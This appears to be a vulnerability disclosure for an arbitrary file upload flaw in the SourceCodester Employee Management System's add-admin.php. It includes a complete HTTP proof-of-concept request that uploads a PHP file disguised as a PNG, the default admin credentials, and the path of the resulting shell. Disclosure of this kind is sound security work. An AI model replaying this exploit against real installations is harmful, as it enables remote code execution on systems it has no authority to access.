# RCE-1

## Vulnerability Description

Arbitrary file upload vulnerability in SourceCodester [Employee Management System using PHP and MySQL](https://www.sourcecodester.com/php/16999/employee-management-system.html) allows attackers to execute arbitrary code via the file upload to add-admin.php. It is an open source project from [https://www.sourcecodester.com/](https://www.sourcecodester.com/).

1. BUG_Author:  XuJianLin
2. vendors: [Employee Management System using PHP and MySQL](https://www.sourcecodester.com/php/16999/employee-management-system.html);
3. The program is built using the  PHP 7.3.4nts version;
4. Vulnerability location: /employee_akpoly/Admin/add-admin.php

# Vulnerability Verification

[+] Payload:

```
<?php phpinfo();?>
```

POC：

```js
POST http://192.168.10.108/employee_akpoly/Admin/add-admin.php HTTP/1.1
Host: 192.168.10.108
Content-Length: 701
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.10.108
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx29tkKTC1YYpYwZs
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.10.108/employee_akpoly/Admin/add-admin.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: ci_session=ees3tjel0fsobjmnvj6ghqu8l2dbl0q5; PHPSESSID=eus8iflugmq89jkbi16btkvoof
Connection: close

------WebKitFormBoundaryx29tkKTC1YYpYwZs
Content-Disposition: form-data; name="txtusername"

aaa
------WebKitFormBoundaryx29tkKTC1YYpYwZs
Content-Disposition: form-data; name="txtfullname"


------WebKitFormBoundaryx29tkKTC1YYpYwZs
Content-Disposition: form-data; name="txtpassword"


------WebKitFormBoundaryx29tkKTC1YYpYwZs
Content-Disposition: form-data; name="txtphone"


------WebKitFormBoundaryx29tkKTC1YYpYwZs
Content-Disposition: form-data; name="avatar"; filename="demo-bank-card-1.php"
Content-Type: image/png

<?php phpinfo();?>
------WebKitFormBoundaryx29tkKTC1YYpYwZs
Content-Disposition: form-data; name="btncreate"


------WebKitFormBoundaryx29tkKTC1YYpYwZs--

```

## How to verify

1.Build the vulnerability environment according to the steps provided by the source code author ;

2.login to the "Admin Panel” through the default account and password（username: admin Password: admin123）;

3.Shell Path:   **/employee_akpoly/uploadImage/Profile/demo-bank-card-1.php**

The vulnerability lies in the "User Management - Add User " function, you shuold inserts Payload when you update photo，as shown in the following figure：

​![image-20240309153602-igp7h78](https://github.com/LiAoRJ/CVE_Hunter/assets/80115065/758b953b-3742-4496-bf6d-13546e1d90f5)

![image-20240309153647-ngyoo56](https://github.com/LiAoRJ/CVE_Hunter/assets/80115065/b2dd8e77-b2e4-4ea0-9e9e-55a6dd3cf0b0)

​![image-20240309154232-5ru7vex](https://github.com/LiAoRJ/CVE_Hunter/assets/80115065/5234e1fc-a98f-4c13-9395-fb4b2f353ade)

​![image-20240309155540-y6ug2wq](https://github.com/LiAoRJ/CVE_Hunter/assets/80115065/444b2ccd-d325-4de2-9322-0790c4d037fd)

​
